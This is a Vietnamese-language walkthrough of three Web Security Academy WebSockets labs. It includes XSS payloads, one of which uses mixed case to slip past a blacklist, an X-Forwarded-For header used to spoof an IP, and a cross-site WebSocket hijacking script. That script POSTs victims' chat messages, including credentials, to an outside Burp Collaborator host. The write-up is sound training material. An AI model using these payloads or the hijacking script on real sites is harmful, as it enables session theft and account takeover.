# Testing for WebSockets security vulnerabilities

## WebSockets Lab

### Lab: Manipulating WebSocket messages to exploit vulnerabilities
Bài lab đã mô tả cho chúng ta biết, lỗ hổng nằm ở live chat sử dụng Websockets, và yêu cầu chúng ta hiện lên thông báo aler() (lỗ hổng XSS) để hoàn thành bài lab.


Truy cập vào bài lab chúng ta thấy được 1 web site bán hàng, để ý ở góc phải chúng ta thấy được chức năng live chat để exploit. 

Sau khi vào chức năng live chat chúng ta gửi 1 đoạn chat tùy ý và dùng burp suite bắt lại request để xử lí.


Chúng ta thay message đã bắt được bằng cheat sheet:
```
<img src=1 onerror='alert(Malwar3 hacked)'>
```


### Lab: Manipulating the WebSocket handshake to exploit vulnerabilities

Bài lab tiếp theo cũng tương tự như bài trước và chúng ta  khai thác bằng message.

Tuy nhiên khi chúng ta làm tương tự bài trước thì phát hiện ra cheat sheet : 
```
<img src=1 onerror='alert(Malwar3 hacked)'>
```
Đã bị block và chúng ta không thể truy cập vào live chat được nữa, thêm header sau vào yêu cầu handshake để giả mạo địa chỉ IP :
```
X-Forwarded-For: 1.1.1.1
```
Sau đó dùng cheat sheet như sau để bypass qua blacklist của web site: 
```
<img src=1 oNeRrOr=alert`1`>
```



### Lab: Cross-site WebSocket hijacking

Bài lab này hoàn toàn khác so với 2 bài trên, theo mô tả thì chúng ta vẫn sẽ khai thác từ live chat nhưng sẽ sử dụng hỗ trợ từ burp suite để sử dụng 1 máy chủ khác đê leak thông tin username và passwod.
Login thành công thì chúng ta solve bài lab


```
<script>
  var ws = new WebSocket('wss://ac801f551fa28b3880826dc5006000a3.web-security-academy.net/chat');
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    fetch('https://3imjc6h5a1t0tr9blcmtybnav11upj.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: event.data});
  };
</script>
```
